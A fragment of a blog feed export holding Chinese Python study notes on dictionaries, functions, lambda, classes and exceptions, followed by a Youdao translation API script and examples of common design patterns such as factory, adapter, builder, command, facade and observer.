href="#成员关系操作" class="headerlink" title="成员关系操作"></a>成员关系操作</h2><p>in 和has_key()</p><pre><code class="python">phone in infoinfo.has_key(&#39;phone&#39;)</code></pre><h2 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h2><p>keys()   :返回的是列表，里面包含了字典的所有键<br>values() :返回的是列表，里面包含了字典的所有值<br>items()  :生成一个字典的容器 :[()]</p><p>binfo = {‘a’:[1,2,3],’b’:[4,5,6]}<br>binfo[‘a’][2] = 5     #修改的方式</p><p>字典排序，以键从小到大</p><pre><code>key_list = a.keys()key_list.sort()for x in key_list:    print(x,a[x])</code></pre><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>定义</p><pre><code class="python">def a():    &quot;在这里写函数文档&quot;    retur 4print(test.__doc__) #输出函数文档#是class时写在class开头，也可写在整个文件的开头，使用模块名.__doc__方式访问</code></pre><p>带参数，有默认值</p><pre><code class="python">def test(a=4):    return adef test3(a,c,d=&quot;json&quot;):    returntest3(2,3,d=&quot;xml&quot;)</code></pre><pre><code class="python">global b #在函数中声明全局变量，声明后可以修改全局变量</code></pre><pre><code class="python">def test1(**kr):    return krprint(test1(c=1,g=24)) #转换成字典输出def test2(*z):    return zprint(test2(1,2,3,435,[2,3,4])) #转换成元组输出def test(*z,**kr): #一种用法：可以用于读取多余的参数，保函数运行    return z,kr#&quot;**&quot; 字典#&quot;*&quot;  元组</code></pre><h1 id="函数注意点"><a href="#函数注意点" class="headerlink" title="函数注意点"></a>函数注意点</h1><ul><li>功能完整</li><li>异常处理完善</li><li>参数默认值:更省事，更可配置</li></ul><pre><code class="python"> assert add(2,4) == 3     #assert :断言，对函数返回值和类型进行确认dir(func.__code)__)       #查看该属性拥有的项func.__code__.co_varnames #查看函数有哪些参数func.__code__.co_filename #查看该函数来自哪个文件</code></pre><h1 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h1><ol><li>lambda是一个表达式。</li><li>它没有名称，存储的也不是代码块，而是表达式。</li><li>它被用作执行很小的功能，不能在里面使用条件语句。</li></ol><pre><code class="python">d = lambda x:x+1print(d(2))d = lambda x:x+1 if x &gt; 0 else &quot;error&quot;#d = lambda x:列表推导式d = lambda x:[(x,i) for i in xrange(0,10)]t = [1,2,3,4,5]g = filter(lambda x:x &gt; 3,t) #过滤出大于 3 的数字</code></pre><h1 id="函数参数位置："><a href="#函数参数位置：" class="headerlink" title="函数参数位置："></a>函数参数位置：</h1><ol><li>先是位置匹配的参数</li><li>再是关键字匹配的参数</li><li>收集匹配的元组参数</li><li>收集匹配的关键字参数</li></ol><ol><li>如何去定义一个最基本的class</li><li>class最基本的子元素</li><li>class传参</li><li><strong>init</strong>方法</li><li>class和函数的区别</li></ol><h1 id="定义-class"><a href="#定义-class" class="headerlink" title="定义 class"></a>定义 class</h1><p>可继承，重写，</p><pre><code class="python"># -*- coding: utf-8 -*-class test(object): #所有的class都是object的派生类    a = 1 #属性    #当定义一个class的内置方法时，方法的参数的第一个永远是self。    def __init__(self,var1): #构造函数        self.var1 = var1 #这里的 self.var1 为全局变量    #get被称之为test对象的方法    def get(self,a=None):        return self.var1    def __del__(self): #析构函数        del self.arg1    pass#使用t = test(&#39;test str heiheihei&#39;)print(t.get())</code></pre><ol><li>通过在一个变量或者函数之前加上下划线来表示私有变量的，例如__spam(这里是两个下划线)就是私有的。</li><li>Python会在类的内部自动的把你定义的<strong>spam变量的名字替换成为 _classname</strong>spam(注意，classname前面是一个下划线，spam前是两个下划线)，Python把这种技术叫做“name mangling”。因此，用户在外部访问__spam的时候就会提示找不到相应的变量。</li></ol><h1 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h1><p>包的创建 :文件夹中创建 <strong>init</strong>.py 文件</p><p>搜索模块</p><pre><code class="python">import  syssys.path.append(&#39;/tmp/m2&#39;) #添加模块搜索路径</code></pre><p>下面的含义是: 当前文件作为主函数时执行，其他文件 import 不执行</p><pre><code>if __name__ == &quot;__main__&quot;:    pass</code></pre><h1 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h1><h2 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h2><pre><code class="python">try:    passexcept Error:    passfjinally:  #终止行为    pass</code></pre><h2 id="引发异常"><a href="#引发异常" class="headerlink" title="引发异常"></a>引发异常</h2><pre><code class="python">try:    raise IndexError #引发异常except IndexError:    pass</code></pre><p>assert语句也可以用来触发异常，它是一个有条件的raise，主要用在开发过程中调试</p><p>assert False, “出错信息”</p><h2 id="用户自定义的异常"><a href="#用户自定义的异常" class="headerlink" title="用户自定义的异常"></a>用户自定义的异常</h2><pre><code class="python">class Bad(Exception):    passdef doomed():    raise Bad()try:    doomed()except Bad:    print(&#39;got Bad&#39;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>有道翻译接口调用.md</title>
      <link href="/2019/12/02/deploy/others/%E6%9C%89%E9%81%93%E7%BF%BB%E8%AF%91%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8/"/>
      <url>/2019/12/02/deploy/others/%E6%9C%89%E9%81%93%E7%BF%BB%E8%AF%91%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<pre><code class="python">import jsonimport requests# 翻译函数，word 需要翻译的内容def translate(word):    # 有道词典 api    url = &#39;http://fanyi.youdao.com/translate?smartresult=dict&amp;smartresult=rule&amp;smartresult=ugc&amp;sessionFrom=null&#39;    # 传输的参数，其中 i 为需要翻译的内容    key = {        &#39;type&#39;: &quot;AUTO&quot;,        &#39;i&#39;: word,        &quot;doctype&quot;: &quot;json&quot;,        &quot;version&quot;: &quot;2.1&quot;,        &quot;keyfrom&quot;: &quot;fanyi.web&quot;,        &quot;ue&quot;: &quot;UTF-8&quot;,        &quot;action&quot;: &quot;FY_BY_CLICKBUTTON&quot;,        &quot;typoResult&quot;: &quot;true&quot;    }    # key 这个字典为发送给有道词典服务器的内容    response = requests.post(url, data=key)    # 判断服务器是否相应成功    if response.status_code == 200:        # 然后相应的结果        return response.text    else:        print(&quot;有道词典调用失败&quot;)        # 相应失败就返回空        return Nonedef get_reuslt(repsonse):    # 通过 json.loads 把返回的结果加载成 json 格式    result = json.loads(repsonse)    print (&quot;输入的词为：%s&quot; % result[&#39;translateResult&#39;][0][0][&#39;src&#39;])    print (&quot;翻译结果为：%s&quot; % result[&#39;translateResult&#39;][0][0][&#39;tgt&#39;])def main():    print(&quot;本程序调用有道词典的API进行翻译，可达到以下效果：&quot;)    print(&quot;外文--&gt;中文&quot;)    print(&quot;中文--&gt;英文&quot;)    word = input(&#39;请输入你想要翻译的词或句：&#39;)    list_trans = translate(word)    get_reuslt(list_trans)if __name__ == &#39;__main__&#39;:    main()</code></pre>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py abstract_factory_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20abstract_factory_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20abstract_factory_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;抽象工厂: 解决复杂对象创建问题&quot;&quot;&quot;class Frog:    def __init__(self, name):        self.name = name    def __str__(self):        return self.name    def interact_with(self, obstacle):        &quot;&quot;&quot; 不同类型玩家遇到的障碍不同 &quot;&quot;&quot;        print(&#39;{} the Frog encounters {} and {}!&#39;.format(            self, obstacle, obstacle.action()))class Bug:    def __str__(self):        return &#39;a bug&#39;    def action(self):        return &#39;eats it&#39;class FrogWorld:    def __init__(self, name):        print(self)        self.player_name = name    def __str__(self):        return &#39;\n\n\t----Frog World -----&#39;    def make_character(self):        return Frog(self.player_name)    def make_obstacle(self):        return Bug()class Wizard:    def __init__(self, name):        self.name = name    def __str__(self):        return self.name    def interact_with(self, obstacle):        print(&#39;{} the Wizard battles against {} and {}!&#39;.format(            self, obstacle, obstacle.action()))class Ork:    def __str__(self):        return &#39;an evil ork&#39;    def action(self):        return &#39;kill it&#39;class WizardWorld:    def __init__(self, name):        print(self)        self.player_name = name    def __str__(self):        return &#39;\n\n\t------ Wizard World -------&#39;    def make_character(self):        return Wizard(self.player_name)    def make_obstacle(self):        return Ork()class GameEnvironment:    &quot;&quot;&quot; 抽象工厂，根据不同的玩家类型创建不同的角色和障碍 (游戏环境)    这里可以根据年龄判断，成年人返回『巫师』游戏，小孩返回『青蛙过河』游戏    这里的形参 factory 就是抽象工厂&quot;&quot;&quot;    def __init__(self, factory):        self.hero = factory.make_character()        self.obstacle = factory.make_obstacle()    def play(self):        self.hero.interact_with(self.obstacle)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py adapter_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20adapter_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20adapter_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;适配器模式: 解决接口不兼容问题&quot;&quot;&quot;class Computer:    def __init__(self, name):        self.name = name    def __str__(self):        return &#39;the {} computer&#39;.format(self.name)    def execute(self):        &quot;&quot;&quot; call by client code &quot;&quot;&quot;        return &#39;execute a program&#39;class Synthesizer:    def __init__(self, name):        self.name = name    def __str__(self):        return &#39;the {} synthesizer&#39;.format(self.name)    def play(self):        return &#39;is playing an electroinc song&#39;class Human:    def __init__(self, name):        self.name = name    def __str__(self):        return &#39;the {} human&#39;.format(self.name)    def speak(self):        return &#39;says hello&#39;class Adapter:    def __init__(self, obj, adapted_methods):        &quot;&quot;&quot; 不使用继承，使用__dict__属性实现适配器模式 &quot;&quot;&quot;        self.obj = obj        self.__dict__.update(adapted_methods)    def __str__(self):        return str(self.obj)# 适配器使用示例def main():    objs = [Computer(&#39;Asus&#39;)]    synth = Synthesizer(&#39;moog&#39;)    objs.append(Adapter(synth, dict(execute=synth.play)))    human = Human(&#39;Wnn&#39;)    objs.append(Adapter(human, dict(execute=human.speak)))    for o in objs:        # 用统一的execute适配不同对象的方法，这样在无需修改源对象的情况下就实现了不同对象方法的适配        print(&#39;{} {}&#39;.format(str(o), o.execute()))if __name__ == &quot;__main__&quot;:    main()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py builder_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20builder_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20builder_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;构造模式: 控制复杂对象的构造当对象需要多个部分组合起来一步步创建，并且创建和表示分离的时候。可以这么理解，你要买电脑，工厂模式直接返回一个你需要型号的电脑，但是构造模式允许你自定义电脑各种配置类型，组装完成后给你。这个过程你可以传入builder从而自定义创建的方式。&quot;&quot;&quot;class Computer:    def __init__(self, serial_number):        self.serial = serial_number        self.memory = None  # in gigabytes        self.hdd = None  # in gigabytes        self.gpu = None    def __str__(self):        info = (&#39;Memory: {}GB&#39;.format(self.memory),                &#39;Hard Disk: {}GB&#39;.format(self.hdd),                &#39;Graphics Card: {}&#39;.format(self.gpu))        return &#39;\n&#39;.join(info)class ComputerBuilder:    def __init__(self):        self.computer = Computer(&#39;AG23385193&#39;)    def configure_memory(self, amount):        self.computer.memory = amount    def configure_hdd(self, amount):        self.computer.hdd = amount    def configure_gpu(self, gpu_model):        self.computer.gpu = gpu_modelclass HardwareEngineer:    def __init__(self):        self.builder = None    def construct_computer(self, memory, hdd, gpu):        self.builder = ComputerBuilder()        [step for step in (self.builder.configure_memory(memory),                           self.builder.configure_hdd(hdd),                           self.builder.configure_gpu(gpu))]    @property    def computer(self):        return self.builder.computer# 使用buidler，可以创建多个builder类实现不同的组装方式engineer = HardwareEngineer()engineer.construct_computer(hdd=500, memory=8, gpu=&#39;GeForce GTX 650 Ti&#39;)computer = engineer.computerprint(computer)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py chain_of_responsibility_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20chain_of_responsibility_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20chain_of_responsibility_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;责任链模式:创建链式对象用来接收广播消息开始介绍行为型设计模式，行为型设计模式处理对象之间的交互和算法问题。在责任连模式中，我们把消息发送给一系列对象的首个节点，对象可以选择处理消息或者向下一个对象传递,只有对消息感兴趣的节点处理。&quot;&quot;&quot;class Event:    def __init__(self, name):        self.name = name    def __str__(self):        return self.nameclass Widget:    &quot;&quot;&quot;Docstring for Widget. &quot;&quot;&quot;    def __init__(self, parent=None):        self.parent = parent    def handle(self, event):        handler = &#39;handle_{}&#39;.format(event)        if hasattr(self, handler):            method = getattr(self, handler)            method(event)        elif self.parent:            self.parent.handle(event)        elif hasattr(self, &#39;handle_default&#39;):            self.handle_default(event)class MainWindow(Widget):    def handle_close(self, event):        print(&#39;MainWindow: {}&#39;.format(event))    def handle_default(self, event):        print(&#39;MainWindow: Default {}&#39;.format(event))class SendDialog(Widget):    def handle_paint(self, event):        print(&#39;SendDialog: {}&#39;.format(event))class MsgText(Widget):    def handle_down(self, event):        print(&#39;MsgText: {}&#39;.format(event))def main():    # 注册责任人    mw = MainWindow()    sd = SendDialog(mw)  # parent是mw    msg = MsgText(sd)    for e in (&#39;down&#39;, &#39;paint&#39;, &#39;unhandled&#39;, &#39;close&#39;):        evt = Event(e)        print(&#39;\nSending event -{}- to MainWindow&#39;.format(evt))        mw.handle(evt)        print(&#39;Sending event -{}- to SendDialog&#39;.format(evt))        sd.handle(evt)        print(&#39;Sending event -{}- to MsgText&#39;.format(evt))        msg.handle(evt)        print(&quot;\n&quot;)if __name__ == &quot;__main__&quot;:    main()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py cmmand_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20cmmand_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20cmmand_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;命令模式：用来给应用添加Undo操作命令模式帮助我们把一个操作(undo,redo,copy,paste等)封装成一个对象，通常是创建一个包含Operation所有逻辑和方法的类。通过命令模式可以控制命令的执行时间和过程，还可以用来组织事务。&quot;&quot;&quot;import osclass RenameFile:    def __init__(self, path_src, path_dest):        &quot;&quot;&quot; 在init里保存一些必要信息，比如undo需要的老的和新的文件名 &quot;&quot;&quot;        self.src, self.dest = path_src, path_dest    def execute(self, verbose=False):        if verbose:            print(&quot;[renaming &#39;{}&#39; to &#39;{}&#39;]&quot;.format(self.src, self.dest))        os.rename(self.src, self.dest)    def undo(self, verbose=False):        if verbose:            print(&quot;[renaming &#39;{}&#39; back to &#39;{}&#39;]&quot;.format(self.dest, self.src))        os.rename(self.dest, self.src)def delete_file(path, verbose=False):    if verbose:        print(&quot;deleting file &#39;{}&quot;.format(path))    os.remove(path)class CreateFile:    def __init__(self, path, txt=&#39;hello world\n&#39;):        self.path, self.txt = path, txt    def execute(self, verbose=False):        if verbose:            print(&quot;[creating file &#39;{}&#39;]&quot;.format(self.path))        with open(self.path, mode=&#39;w&#39;, encoding=&#39;utf-8&#39;) as out_file:            out_file.write(self.txt)    def undo(self):        delete_file(self.path)class ReadFile:    def __init__(self, path):        self.path = path    def execute(self, verbose=False):        if verbose:            print(&quot;[reading file &#39;{}&#39;]&quot;.format(self.path))        with open(self.path, mode=&#39;r&#39;, encoding=&#39;utf-8&#39;) as in_file:            print(in_file.read(), end=&#39;&#39;)def main():    orig_name, new_name = &#39;file1&#39;, &#39;file2&#39;    commands = []    for cmd in CreateFile(orig_name), ReadFile(orig_name), RenameFile(orig_name, new_name):        commands.append(cmd)    [c.execute() for c in commands]    answer = input(&#39;reverse the executed commands? [y/n] &#39;)    if answer not in &#39;yY&#39;:        print(&quot;the result is {}&quot;.format(new_name))        exit()    for c in reversed(commands):        try:            c.undo()  # 执行undo        except AttributeError:            passmain()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py decorator_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20decorator_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20decorator_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;装饰器模式： 无需子类化实现扩展对象功能问题&quot;&quot;&quot;from functools import wrapsdef memoize(fn):    known = dict()    # wraps 则可以将原函数对象的指定属性复制给包装函数对象, 默认有 __module__、__name__、__doc__,或者通过参数选择    @wraps(fn)    def memoizer(*args):        if args not in known:            known[args] = fn(*args)        return known[args]    return memoizer@memoizedef fibonacci(n):    assert(n &gt;= 0), &#39;n must be &gt;= 0&#39;    return n if n in (0, 1) else fibonacci(n-1) + fibonacci(n-2)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py facade_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20facade_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20facade_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;外观模式: 简化复杂对象的访问问题外观模式用来简化复杂系统的访问&quot;&quot;&quot;from abc import ABCMeta, abstractmethodfrom enum import EnumState = Enum(&#39;State&#39;, &#39;new running sleeping restart zombie&#39;)class Server(metaclass=ABCMeta):    &quot;&quot;&quot; 抽象基类 &quot;&quot;&quot;    @abstractmethod    def __init__(self):        pass    def __str__(self):        return self.name    @abstractmethod    def boot(self):        pass    @abstractmethod    def kill(self, restart=True):        passclass FileServer(Server):    def __init__(self):        &#39;&#39;&#39;actions required for initializing the file server&#39;&#39;&#39;        self.name = &#39;FileServer&#39;        self.state = State.new    def boot(self):        print(&#39;booting the {}&#39;.format(self))        &#39;&#39;&#39;actions required for booting the file server&#39;&#39;&#39;        self.state = State.running    def kill(self, restart=True):        print(&#39;Killing {}&#39;.format(self))        &#39;&#39;&#39;actions required for killing the file server&#39;&#39;&#39;        self.state = State.restart if restart else State.zombie    def create_file(self, user, name, permissions):        &#39;&#39;&#39;check validity of permissions, user rights, etc.&#39;&#39;&#39;        print(&quot;trying to create the file &#39;{}&#39; for user &#39;{}&#39; with permissions {}&quot;.format(name, user, permissions))class ProcessServer(Server):    def __init__(self):        &#39;&#39;&#39;actions required for initializing the process server&#39;&#39;&#39;        self.name = &#39;ProcessServer&#39;        self.state = State.new    def boot(self):        print(&#39;booting the {}&#39;.format(self))        &#39;&#39;&#39;actions required for booting the process server&#39;&#39;&#39;        self.state = State.running    def kill(self, restart=True):        print(&#39;Killing {}&#39;.format(self))        &#39;&#39;&#39;actions required for killing the process server&#39;&#39;&#39;        self.state = State.restart if restart else State.zombie    def create_process(self, user, name):        &#39;&#39;&#39;check user rights, generate PID, etc.&#39;&#39;&#39;        print(&quot;trying to create the process &#39;{}&#39; for user &#39;{}&#39;&quot;.format(name, user))class OperatingSystem:    &#39;&#39;&#39; 实现外观模式，外部使用的代码不必知道 FileServer 和 ProcessServer的    内部机制，只需要通过 OperatingSystem类调用&#39;&#39;&#39;    def __init__(self):        self.fs = FileServer()        self.ps = ProcessServer()    def start(self):        &quot;&quot;&quot; 被客户端代码使用 &quot;&quot;&quot;        [i.boot() for i in (self.fs, self.ps)]    def create_file(self, user, name, permissions):        return self.fs.create_file(user, name, permissions)    def create_process(self, user, name):        return self.ps.create_process(user, name)def main():    os = OperatingSystem()    os.start()    os.create_file(&#39;foo&#39;, &#39;hello&#39;, &#39;-rw-r-r&#39;)    os.create_process(&#39;bar&#39;, &#39;ls /tmp&#39;)main()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py fctory_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20fctory_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20fctory_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;工厂模式: 解决对象创建问题&quot;&quot;&quot;import jsonimport xml.etree.ElementTree as etreeclass JSONConnector:    def __init__(self, filepath):        self.data = dict()        with open(filepath, mode=&#39;r&#39;, encoding=&#39;utf8&#39;) as f:            self.data = json.load(f)    @property    def parsed_data(self):        return self.dataclass XMLConnector:    def __init__(self, filepath):        self.tree = etree.parse(filepath)    @property    def parsed_data(self):        return self.treedef connection_factory(filepath):    &quot;&quot;&quot; 工厂方法 &quot;&quot;&quot;    if filepath.endswith(&#39;json&#39;):        connector = JSONConnector    elif filepath.endswith(&#39;xml&#39;):        connector = XMLConnector    else:        raise ValueError(&#39;Cannot connect to {}&#39;.format(filepath))    return connector(filepath)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py flyweight_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20flyweight_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20flyweight_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;享元模式: 实现对象复用从而改善资源使用&quot;&quot;&quot;# 使用对象池技术实现享元模式import randomfrom enum import EnumTreeType = Enum(&#39;TreeType&#39;, &#39;apple_tree cherry_tree peach_tree&#39;)class Tree:    pool = dict()    def __new__(cls, tree_type):        obj = cls.pool.get(tree_type, None)        if obj is None:            obj = object.__new__(cls)            cls.pool[tree_type] = obj            obj.tree_type = tree_type        return obj    def render(self, age, x, y):        print(&#39;render a tree of type {} and age {} at ({}, {})&#39;.format(self.tree_type, age, x, y))def main():    rnd = random.Random()    age_min, age_max = 1, 30  # in years    min_point, max_point = 0, 100    tree_counter = 0    for _ in range(10):        t1 = Tree(TreeType.apple_tree)        t1.render(rnd.randint(age_min, age_max),                  rnd.randint(min_point, max_point),                  rnd.randint(min_point, max_point))        tree_counter += 1    for _ in range(3):        t2 = Tree(TreeType.cherry_tree)        t2.render(rnd.randint(age_min, age_max),                  rnd.randint(min_point, max_point),                  rnd.randint(min_point, max_point))        tree_counter += 1    for _ in range(5):        t3 = Tree(TreeType.peach_tree)        t3.render(rnd.randint(age_min, age_max),                  rnd.randint(min_point, max_point),                  rnd.randint(min_point, max_point))        tree_counter += 1    print(&#39;trees rendered: {}&#39;.format(tree_counter))    print(&#39;trees actually created: {}&#39;.format(len(Tree.pool)))    t4 = Tree(TreeType.cherry_tree)    t5 = Tree(TreeType.cherry_tree)    t6 = Tree(TreeType.apple_tree)    print(&#39;{} == {}? {}&#39;.format(id(t4), id(t5), id(t4) == id(t5)))    print(&#39;{} == {}? {}&#39;.format(id(t5), id(t6), id(t5) == id(t6)))if __name__ == &#39;__main__&#39;:    main()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py interpreter_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20interpreter_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20interpreter_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;解释器模式：用来实现Domain Specific Language(DSL)给定一个语言，定义它的文法的一种表示，并定义一个解释器，这个解释器使用该表示来解释语言中的句子。当有一个语言需要解释执行, 并且你可将该语言中的句子表示为一个抽象语法树时，可使用解释器模式。而当存在以下情况时该模式效果最好：该文法简单对于复杂的文法, 文法的类层次变得庞大而无法管理。此时语法分析程序生成器这样的工具是更好的选择。它们无需构建抽象语法树即可解释表达式, 这样可以节省空间而且还可能节省时间。效率不是一个关键问题，最高效的解释器通常不是通过直接解释语法分析树实现的, 而是首先将它们转换成另一种形式。例如，正则表达式通常被转换成状态机。但即使在这种情况下, 转换器仍可用解释器模式实现, 该模式仍是有用的。&quot;&quot;&quot;from pyparsing import Word, OneOrMore, Optional, Group, Suppress, alphanumsclass Gate:    def __init__(self):        self.is_open = False    def __str__(self):        return &#39;open&#39; if self.is_open else &#39;closed&#39;    def open(self):        print(&#39;opening the gate&#39;)        self.is_open = True    def close(self):        print(&#39;closing the gate&#39;)        self.is_open = Falsedef main():    # 首先定义我们的DSL格式，我们这里最简单的控制语法就是   &quot;open -&gt; gate&quot;    word = Word(alphanums)    command = Group(OneOrMore(word))    token = Suppress(&quot;-&gt;&quot;)    device = Group(OneOrMore(word))    argument = Group(OneOrMore(word))    event = command + token + device + Optional(token + argument)    gate = Gate()    cmds = [&#39;open -&gt; gate&#39;, &#39;close -&gt; gate&#39;]  # 两个自定义的命令    open_actions = {&#39;gate&#39;: gate.open}    close_actions = {&#39;gate&#39;: gate.close}    for cmd in cmds:        print(event.parseString(cmd))  # [[&#39;open&#39;], [&#39;gate&#39;]]        cmd, dev = event.parseString(cmd)        cmd_str, dev_str = &#39; &#39;.join(cmd), &#39; &#39;.join(dev)        print(cmd_str, dev_str)        if &#39;open&#39; in cmd_str:            open_actions[dev_str]()        elif &#39;close&#39; in cmd_str:            close_actions[dev_str]()if __name__ == &quot;__main__&quot;:    main()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py model-view-controller_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20model-view-controller_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20model-view-controller_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;mvc模式：解耦展示逻辑和业务逻辑&quot;&quot;&quot;quotes = (&#39;A man is not complete until he is married. Then he is finished.&#39;,          &#39;As I said before, I never repeat myself.&#39;,          &#39;Behind a successful man is an exhausted woman.&#39;,          &#39;Black holes really suck...&#39;, &#39;Facts are stubborn things.&#39;)class QuoteModel:    def get_quote(self, n):        try:            return quotes[n]        except IndexError:            return &#39;Not found&#39;class QuoteTerminalView:    def show(self, quote):        print(&#39;And the quote is: &quot;{}&quot;&#39;.format(quote))    def error(self, msg):        print(&#39;Error: {}&#39;.format(msg))    def select_quote(self):        return input(&#39;Which quote number would you like to see? &#39;)class QuoteTerminalController:    def __init__(self):        self.model = QuoteModel()        self.view = QuoteTerminalView()    def run(self):        valid_input = False        while not valid_input:            n = self.view.select_quote()            try:                n = int(n)            except ValueError:                self.view.error(&quot;Incorrect index &#39;{}&#39;&quot;.format(n))            else:                valid_input = True                quote = self.model.get_quote(n)                self.view.show(quote)def main():    controller = QuoteTerminalController()    while True:        controller.run()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py observer_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20observer_pattern/"/>
      <url>/2019/11/30/deploy/python/design_patterns/py%20observer_pattern/</url>
      
        <content type="html"><![CDATA[<pre><code class="python"># coding: utf8&quot;&quot;&quot;发布订阅模式：用来处理多个对象之间的发布订阅问题该模式用在当一个对象的状态变更需要通知其他很多对象的时候&quot;&quot;&quot;class Publisher:    def __init__(self):        self.observers = []    def add(self, observer):        if observer not in self.observers:            self.observers.append(observer)        else:            print(&#39;Failed to add : {}&#39;).format(observer)    def remove(self, observer):        try:            self.observers.remove(observer)        except ValueError:            print(&#39;Failed to remove : {}&#39;).format(observer)    def notify(self):        [o.notify_by(self) for o in self.observers]class DefaultFormatter(Publisher):    def __init__(self, name):        super().__init__()        self.name = name        self._data = 0    def __str__(self):        return &quot;{}: &#39;{}&#39; has data = {}&quot;.format(            type(self).__name__, self.name, self._data)    @property    def data(self):        return self._data    @data.setter    def data(self, new_value):        try:            self._data = int(new_value)        except ValueError as e:            print(&#39;Error: {}&#39;.format(e))        else:            self.notify()  # data 在被合法赋值以后会执行notifyclass HexFormatter:    &quot;&quot;&quot; 订阅者 &quot;&quot;&quot;    def notify_by(self, publisher):        print(&quot;{}: &#39;{}&#39; has now hex data = {}&quot;.format(            type(self).__name__, publisher.name, hex(publisher.data)))class BinaryFormatter:    &quot;&quot;&quot; 订阅者 &quot;&quot;&quot;    def notify_by(self, publisher):        print(&quot;{}: &#39;{}&#39; has now bin data = {}&quot;.format(            type(self).__name__, publisher.name, bin(publisher.data)))if __name__ == &quot;__main__&quot;:    df = DefaultFormatter(&#39;test1&#39;)    print(df)    print()    hf = HexFormatter()    df.add(hf)    df.data = 3    print(df)    print()    bf = BinaryFormatter()    df.add(bf)    df.data = 21    print(df)</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> design_patterns </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py prototype_pattern.md</title>
      <link href="/2019/11/30/deploy/python/design_patterns/py%20prototype_pattern/"/>
